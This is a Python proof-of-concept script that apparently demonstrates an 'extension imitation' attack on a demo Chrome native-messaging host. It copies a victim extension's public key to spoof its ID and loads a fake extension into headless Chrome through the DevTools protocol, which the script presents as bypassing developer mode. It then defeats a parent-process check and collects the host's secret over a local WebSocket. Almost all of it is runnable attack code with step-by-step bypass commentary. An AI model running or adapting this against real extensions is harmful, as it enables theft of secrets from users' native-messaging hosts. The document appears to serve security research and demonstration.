#!/usr/bin/env python3
"""
Attack 3: Extension Imitation
==============================
Replicates the victim extension's Chrome extension ID by extracting its RSA
public key from manifest.json. A fake extension with the same ID is loaded
into headless Chrome via CDP, bypassing the developer-mode restriction.
The fake extension connects to the real NM host — the allowed_origins check
passes because the ID matches — and reports the stolen secret back to this
script over a local WebSocket.

Run: python3 attack3_extension_imitation.py --setup
"""

import sys, os, json, subprocess, hashlib, base64
import asyncio, signal, time

# ── Paths ─────────────────────────────────────────────────────────────────────

SCRIPT_DIR       = os.path.dirname(os.path.abspath(__file__))
DEMO_DIR         = os.path.dirname(SCRIPT_DIR)
DEMO_EXT         = os.path.join(DEMO_DIR, "demo_extension", "manifest.json")
FAKE_EXT         = os.path.join(SCRIPT_DIR, "fake_extension")
ATTACKER_PROFILE = os.path.join(SCRIPT_DIR, ".attacker_profile_a3")

HOST_NAME        = "com.demo.securevault"
SYSTEM_NM_DIR    = "/Library/Google/Chrome/NativeMessagingHosts"

WS_PORT  = 13502
CDP_PORT = 9226

# ── Printing helpers ──────────────────────────────────────────────────────────

def banner():
    print("\n" + "="*65)
    print("  ATTACK 3: EXTENSION IMITATION")
    print("  Fake extension uses same ID as victim, NM host admits it")
    print("="*65)

def control(n, msg):
    print(f"\n  Control {n}: {msg}")

def step(n, title):
    print(f"\n  Step {n}: {title}")
    print(f"  {'─'*55}")

def info(msg):
    print(f"            {msg}")

def bypass(msg):
    print(f"\n  >> {msg}")

def secret_banner(secret):
    print(f"\n  {'*'*55}")
    print(f"  Secret obtained by fake extension:")
    print(f"  {secret}")
    print(f"  {'*'*55}")

def pause(msg="  Press Enter to continue..."):
    input(f"\n{msg}")


# ── Key extraction ────────────────────────────────────────────────────────────

def extract_key_and_id():
    with open(DEMO_EXT) as f:
        m = json.load(f)
    key_b64 = m.get("key")
    if not key_b64:
        print("  ERROR: demo_extension/manifest.json has no 'key' field.")
        sys.exit(1)
    pub_der = base64.b64decode(key_b64)
    sha = hashlib.sha256(pub_der).hexdigest()[:32]
    ext_id = ''.join(chr(ord('a') + int(c, 16)) for c in sha)
    return key_b64, ext_id


# ── Manifest helpers ──────────────────────────────────────────────────────────

def read_system_manifest():
    path = os.path.join(SYSTEM_NM_DIR, f"{HOST_NAME}.json")
    try:
        with open(path) as f:
            return json.load(f)
    except FileNotFoundError:
        print(f"  ERROR: System manifest not found. Run install.sh first.")
        sys.exit(1)
    except PermissionError:
        print(f"  ERROR: Cannot read {path}. Run: sudo chmod 644 {path}")
        sys.exit(1)

def write_nm_manifest_in_profile(real_host_path, ext_id):
    """Put the real NM manifest in the attacker profile directory.

    When Chrome runs with --user-data-dir it reads NM manifests from
    <user-data-dir>/NativeMessagingHosts/ — NOT from the OS-level paths.
    We must place the manifest there so headless Chrome can spawn the real host.
    """
    nm_dir = os.path.join(ATTACKER_PROFILE, "NativeMessagingHosts")
    os.makedirs(nm_dir, exist_ok=True)
    manifest = {
        "name": HOST_NAME,
        "description": "Real host — accessible from attacker Chrome profile",
        "path": real_host_path,
        "type": "stdio",
        "allowed_origins": [f"chrome-extension://{ext_id}/"]
    }
    path = os.path.join(nm_dir, f"{HOST_NAME}.json")
    with open(path, 'w') as f:
        json.dump(manifest, f, indent=2)
    return path


# ── SETUP MODE ────────────────────────────────────────────────────────────────

def run_setup():
    banner()

    print("\n  Controls in place:")
    control(1, "The NM manifest lists allowed_origins, Chrome only forwards "
               "connections from the specific demo victim extension ID to this host.")
    control(2, "Chrome enforces developer mode, unpacked extensions cannot be "
               "loaded without manually enabling it in chrome://extensions.")
    control(3, "The demo victim host verifies its parent process is Google Chrome "
               "before responding to any request.")

    pause()

    # ── Step 1: Extract the victim key and derive the extension ID ────────────
    step(1, "Extracting the victim extension's public key and deriving its ID")
    info("Extension IDs are derived from the public key (SHA-256 of DER bytes,")
    info("first 32 nibbles mapped a-p). Key sources: .crx package, Chrome Preferences /")
    info("Secure Preferences (extensions.settings.<id>.manifest.key), installed")
    info("extension directory, or unpacked manifest.json.")
    info("")
    info(f"Reading: {DEMO_EXT}")

    key_b64, ext_id = extract_key_and_id()

    info(f"Public key (first 60 chars): {key_b64[:60]}...")
    info(f"Derived extension ID:        {ext_id}")

    bypass("Bypassing Control 1: same key -> same ID -> allowed_origins check passes.")

    pause()

    # ── Step 2: Patch fake extension and write NM manifest into profile ───────
    step(2, "Patching the fake extension and preparing the attacker Chrome profile")

    fake_manifest_path = os.path.join(FAKE_EXT, "manifest.json")
    with open(fake_manifest_path) as f:
        fake_m = json.load(f)
    old_key = fake_m.get("key", "PLACEHOLDER")
    info(f"Patching: {fake_manifest_path}")
    info(f"Before: key = {old_key[:30] if len(old_key) > 30 else old_key}")
    fake_m["key"] = key_b64
    with open(fake_manifest_path, 'w') as f:
        json.dump(fake_m, f, indent=2)
    info(f"After:  key = {key_b64[:60]}...")
    info("")

    sys_manifest = read_system_manifest()
    real_host_path = sys_manifest["path"]
    nm_path = write_nm_manifest_in_profile(real_host_path, ext_id)
    info(f"NM manifest written to: {nm_path}")
    info(f"  -> Points to: {real_host_path}")
    info("")
    info("Headless Chrome spawns the real host, its parent IS Chrome, so the parent check passes.")

    bypass("Bypassing Control 3: headless Chrome IS Chrome, parent check passes.")

    pause()

    # ── Step 3: Launch headless Chrome and load fake extension via CDP ────────
    step(3, "Launching headless Chrome and loading the fake extension via CDP")
    info("Fake extension connects to the real NM host, sends { action: 'get_secret' },")
    info("and reports the secret back over WebSocket to this script.")
    info(f"CDP port {CDP_PORT} | WebSocket receiver ws://localhost:{WS_PORT}")
    info("")

    bypass("Bypassing Control 2: Extensions.loadUnpacked via CDP bypasses developer mode.")

    asyncio.run(run_attack_async(key_b64, ext_id, fake_manifest_path))


# ── Async attack core ─────────────────────────────────────────────────────────

async def run_attack_async(key_b64, ext_id, fake_manifest_path):
    import websockets

    chrome_bin = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
    stolen_secret = [None]
    chrome_proc   = [None]

    def cleanup(sig=None, frame=None):
        print("\n\n  Cleaning up...")
        try:
            with open(fake_manifest_path) as f:
                fm = json.load(f)
            fm["key"] = "PLACEHOLDER"
            with open(fake_manifest_path, 'w') as f:
                json.dump(fm, f, indent=2)
        except Exception:
            pass
        if chrome_proc[0]:
            chrome_proc[0].terminate()
            print("  Attacker headless Chrome terminated.")
        print("  Done.")
        sys.exit(0)

    signal.signal(signal.SIGINT, cleanup)

    # ── Start WebSocket receiver ──────────────────────────────────────────────
    async def ws_handler(websocket):
        async for raw in websocket:
            try:
                msg = json.loads(raw)
                event = msg.get("event", "")
                info(f"  ws_recv: {raw.strip()}")
                if event == "secret_stolen" and msg.get("secret"):
                    stolen_secret[0] = msg["secret"]
                    secret_banner(msg["secret"])
                elif event == "nm_recv":
                    pass   # normal protocol traffic, already shown above
                elif event == "error":
                    info(f"  ws_error: {msg.get('error')}")
            except Exception:
                pass

    async with websockets.serve(ws_handler, "localhost", WS_PORT):
        info(f"  WebSocket server listening on ws://localhost:{WS_PORT}")
        info("")

        # ── Launch headless Chrome ────────────────────────────────────────────
        os.makedirs(ATTACKER_PROFILE, exist_ok=True)
        proc = subprocess.Popen([
            chrome_bin,
            f"--remote-debugging-port={CDP_PORT}",
            "--headless=new",
            "--disable-gpu",
            f"--user-data-dir={ATTACKER_PROFILE}",
            "--no-first-run",
            "--no-default-browser-check",
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        chrome_proc[0] = proc

        await asyncio.sleep(2.0)

        # ── Connect to CDP ────────────────────────────────────────────────────
        import urllib.request
        try:
            browser_info = json.loads(urllib.request.urlopen(
                f"http://localhost:{CDP_PORT}/json/version"
            ).read())
            ws_url = browser_info["webSocketDebuggerUrl"]
        except Exception as e:
            info(f"  ERROR: CDP not reachable: {e}")
            cleanup()
            return

        async with websockets.connect(ws_url) as cdp:
            await cdp.send(json.dumps({
                "id": 1,
                "method": "Extensions.loadUnpacked",
                "params": {"path": FAKE_EXT}
            }))
            resp = json.loads(await asyncio.wait_for(cdp.recv(), timeout=10))
            if "error" in resp:
                info(f"  WARNING: CDP loadUnpacked error: {resp['error']}")
                cleanup()
                return
            loaded_id = resp.get("result", {}).get("id", "unknown")

        info(f"  Attacker headless Chrome launched (PID {proc.pid})")
        info(f"  Fake extension loaded, ID: {loaded_id}")
        info("")
        info("  Waiting for the fake extension to connect to the real demo victim host...")
        info("  Press Ctrl+C to stop.")
        info("")

        # ── Wait for stolen secret ────────────────────────────────────────────
        timeout = 60
        elapsed = 0
        while stolen_secret[0] is None and elapsed < timeout:
            await asyncio.sleep(0.5)
            elapsed += 0.5

        if stolen_secret[0] is None:
            info(f"  Timed out after {timeout}s, fake extension did not report a secret.")

    cleanup()


# ── Entry point ───────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--setup":
        run_setup()
    else:
        print("Usage:")
        print("  python3 attack3_extension_imitation.py --setup")
        sys.exit(1)
